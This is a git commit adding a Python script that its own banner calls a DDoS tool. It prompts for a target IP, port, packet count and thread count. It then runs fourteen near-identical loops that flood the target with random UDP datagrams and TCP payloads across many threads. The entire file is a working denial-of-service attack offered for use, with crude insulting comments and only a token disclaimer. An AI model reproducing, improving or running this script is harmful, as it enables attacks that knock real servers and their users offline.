e52b5793a6ea30701b33236232ef3a701e798f37
DevterXyz <105544452+DevterXyz@users.noreply.github.com>
2022-07-11 08:28:30 +0700

    Add files via upload

---
+++ EXCITEDV2.py
@@ -0,0 +1,253 @@
+#Mau Rename Lu Kontol
+#Author ΣXCITΣD 13
+#Tools By ΣXCITΣD 13
+import random
+import socket
+import threading
+import os,sys
+os.system("clear")
+print("Tools By ΣXCITΣD 13")
+print("Author By ΣXCITΣD 13") 
+print("ΣXCITΣD 13 DDoS Tools")
+print("Jangan Abuse Kontol") 
+
+ip = str(input("IP :"))
+port = int(input("Port :"))
+choice = str(input("GAS ? (y/n):"))
+times = int(input("Packet :"))
+threads = int(input("Threads :"))
+os.system("clear")
+def run():
+    data = random._urandom(1800)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            print("ΣXCITΣD Attack!!!")
+            
+def run2():
+    data = random._urandom(1024)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+            
+def run3():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+
+def run4():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+            
+def run5():
+    data = random._urandom(1800)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            print("ΣXCITΣD Attack")
+            
+def run6():
+    data = random._urandom(1024)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+            
+def run7():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+
+def run8():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+            
+def run9():
+    data = random._urandom(1800)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            print("ΣXCITΣD Attack!!!")
+            
+def run10():
+    data = random._urandom(1024)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+            
+def run11():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+
+def run12():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +" ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+            
+def run13():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+
+def run14():
+    data = random._urandom(16)
+    i = random.choice(("ΣXCITΣD Attack ","ΣXCITΣD Attack ","ΣXCITΣD Attack "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ΣXCITΣD Attack Ip : %s Port : %s"%(ip, port))
+        except:
+            s.close()
+            print("ΣXCITΣD Attack!!!")
+for y in range(threads):
+    if choice == 'y':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+        th = threading.Thread(target = run6)
+        th.start()
+        th = threading.Thread(target = run7)
+        th.start()
+        th = threading.Thread(target = run8)
+        th.start()
+        th = threading.Thread(target = run9)
+        th.start()
+        th = threading.Thread(target = run10)
+        th.start()
+        th = threading.Thread(target = run11)
+        th.start()
+        th = threading.Thread(target = run12)
+        th.start()
+        th = threading.Thread(target = run13)
+        th.start()
+else:
+        th = threading.Thread(target = run14)
+        th.start()
